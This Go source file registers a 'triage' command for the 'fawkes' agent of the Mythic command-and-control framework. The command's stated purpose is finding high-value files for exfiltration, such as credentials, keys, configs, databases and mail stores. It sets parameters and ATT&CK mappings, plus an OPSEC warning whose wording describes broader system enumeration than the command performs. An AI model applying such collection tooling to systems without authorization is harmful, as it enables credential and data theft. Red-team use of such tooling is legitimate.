package agentfunctions

import (
	"encoding/json"
	"fmt"
	"path/filepath"

	agentstructs "github.com/MythicMeta/MythicContainer/agent_structs"
)

func init() {
	agentstructs.AllPayloadData.Get("fawkes").AddCommand(agentstructs.Command{
		Name: "triage",
		AssociatedBrowserScript: &agentstructs.BrowserScript{
			ScriptPath: filepath.Join(".", "fawkes", "browserscripts", "triage_new.js"),
			Author:     "@galoryber",
		},
		Description:         "Find high-value files for exfiltration — documents, credentials, configs, databases, scripts, archives, or custom path scan (T1083, T1005)",
		HelpString:          "triage -action <all|documents|credentials|configs|database|scripts|archives|mail|recent|custom> [-path /opt/app] [-hours 24] [-max_size 10485760] [-max_files 200]",
		Version:             4,
		SupportedUIFeatures: []string{},
		Author:              "@galoryber",
		MitreAttackMappings: []string{"T1083", "T1005"},
		ScriptOnlyCommand:   false,
		CommandAttributes: agentstructs.CommandAttribute{
			SupportedOS: []string{
				agentstructs.SUPPORTED_OS_WINDOWS,
				agentstructs.SUPPORTED_OS_LINUX,
				agentstructs.SUPPORTED_OS_MACOS,
			},
		},
		CommandParameters: []agentstructs.CommandParameter{
			{
				Name:             "action",
				ModalDisplayName: "Action",
				CLIName:          "action",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
				Choices:          []string{"all", "documents", "credentials", "configs", "database", "scripts", "archives", "mail", "recent", "custom"},
				Description:      "Triage mode: all (docs+creds+configs), documents (office/text files), credentials (keys/passwords), configs (yaml/json/env), database (.db/.sqlite/.mdb), scripts (.py/.sh/.ps1), archives (.zip/.tar/.7z), mail (.pst/.ost/.eml/.mbox), recent (files modified within time window), custom (scan specific path)",
				DefaultValue:     "all",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						GroupName:           "Default",
					},
				},
			},
			{
				Name:             "path",
				ModalDisplayName: "Custom Path",
				CLIName:          "path",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				Description:      "Directory to scan (required for 'custom' action)",
				DefaultValue:     "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						GroupName:           "Default",
					},
				},
			},
			{
				Name:             "hours",
				ModalDisplayName: "Hours (recent)",
				CLIName:          "hours",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_NUMBER,
				Description:      "Time window in hours for 'recent' action (default: 24)",
				DefaultValue:     24,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						GroupName:           "Default",
					},
				},
			},
			{
				Name:             "max_size",
				ModalDisplayName: "Max File Size",
				CLIName:          "max_size",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_NUMBER,
				Description:      "Maximum file size in bytes (default: 10MB)",
				DefaultValue:     10485760,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						GroupName:           "Default",
					},
				},
			},
			{
				Name:             "max_files",
				ModalDisplayName: "Max Files",
				CLIName:          "max_files",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_NUMBER,
				Description:      "Maximum number of files to return (default: 200)",
				DefaultValue:     200,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						GroupName:           "Default",
					},
				},
			},
		},
		TaskFunctionParseArgString: func(args *agentstructs.PTTaskMessageArgsData, input string) error {
			if input == "" {
				return nil
			}
			return args.LoadArgsFromJSONString(input)
		},
		TaskFunctionParseArgDictionary: func(args *agentstructs.PTTaskMessageArgsData, input map[string]interface{}) error {
			return args.LoadArgsFromDictionary(input)
		},
		TaskFunctionOPSECPre: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTTaskOPSECPreTaskMessageResponse {
			return agentstructs.PTTTaskOPSECPreTaskMessageResponse{
				TaskID:             taskData.Task.ID,
				Success:            true,
				OpsecPreBlocked:    false,
				OpsecPreMessage:    "OPSEC WARNING: System triage performs broad enumeration (processes, services, network, users, installed software, scheduled tasks). Aggregated system interrogation may trigger behavioral analytics for automated reconnaissance.",
				OpsecPreBypassRole: agentstructs.OPSEC_ROLE_OPERATOR,
			}
		},
		TaskFunctionProcessResponse: func(processResponse agentstructs.PtTaskProcessResponseMessage) agentstructs.PTTaskProcessResponseMessageResponse {
			response := agentstructs.PTTaskProcessResponseMessageResponse{
				TaskID:  processResponse.TaskData.Task.ID,
				Success: true,
			}
			responseText, ok := processResponse.Response.(string)
			if !ok || responseText == "" || responseText == "[]" {
				return response
			}
			var results []struct {
				Path     string `json:"path"`
				Category string `json:"category"`
			}
			if err := json.Unmarshal([]byte(responseText), &results); err != nil {
				return response
			}
			// Group by category, create summary artifacts
			categories := map[string]int{}
			for _, r := range results {
				categories[r.Category]++
			}
			for cat, count := range categories {
				createArtifact(processResponse.TaskData.Task.ID, "File Discovery",
					fmt.Sprintf("Triage: %d %s files discovered", count, cat))
			}
			return response
		},
		TaskFunctionCreateTasking: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskCreateTaskingMessageResponse {
			response := agentstructs.PTTaskCreateTaskingMessageResponse{
				Success: true,
				TaskID:  taskData.Task.ID,
			}
			action, _ := taskData.Args.GetStringArg("action")
			display := fmt.Sprintf("System triage (%s)", action)
			response.DisplayParams = &display
			return response
		},
	})
}
